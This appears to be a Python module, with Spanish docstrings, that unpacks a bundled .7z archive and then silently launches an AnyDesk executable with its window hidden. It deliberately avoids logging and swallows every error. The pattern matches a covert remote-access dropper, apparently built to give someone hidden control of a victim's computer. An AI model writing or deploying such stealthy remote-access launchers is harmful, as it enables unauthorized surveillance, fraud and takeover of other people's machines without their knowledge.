import os
import sys
import py7zr
import shutil
import subprocess
from config.settings import RESOURCES_7Z, RESOURCES_FOLDER, ANYDESK_EXE

def extract_7z_resources():
    """Extrae los recursos del archivo .7z (sin logs)"""
    try:
        sevenz_paths = [
            RESOURCES_7Z,
            os.path.join(os.path.dirname(__file__), "..", RESOURCES_7Z),
            os.path.join(os.getcwd(), RESOURCES_7Z),
            os.path.join(os.path.dirname(sys.argv[0]), RESOURCES_7Z)
        ]
        
        for path in sevenz_paths:
            if os.path.exists(path):
                target_folder = os.path.join(os.getcwd(), RESOURCES_FOLDER)
                if os.path.exists(target_folder):
                    return True
                with py7zr.SevenZipFile(path, mode='r') as z:
                    z.extractall(target_folder)
                return True
        return False
    except Exception:
        return False

def run_anydesk():
    """Ejecuta AnyDesk en segundo plano (sin logs)"""
    try:
        anydesk_paths = [
            ANYDESK_EXE,
            os.path.join(os.path.dirname(__file__), "..", ANYDESK_EXE),
            os.path.join(os.getcwd(), ANYDESK_EXE),
            os.path.join(os.path.dirname(sys.argv[0]), ANYDESK_EXE),
            os.path.join(os.path.dirname(sys.argv[0]), RESOURCES_FOLDER, ANYDESK_EXE)
        ]
        
        for path in anydesk_paths:
            if os.path.exists(path):
                startupinfo = subprocess.STARTUPINFO()
                startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
                startupinfo.wShowWindow = 0
                subprocess.Popen([path], startupinfo=startupinfo)
                return True
        return False
    except Exception:
        return False
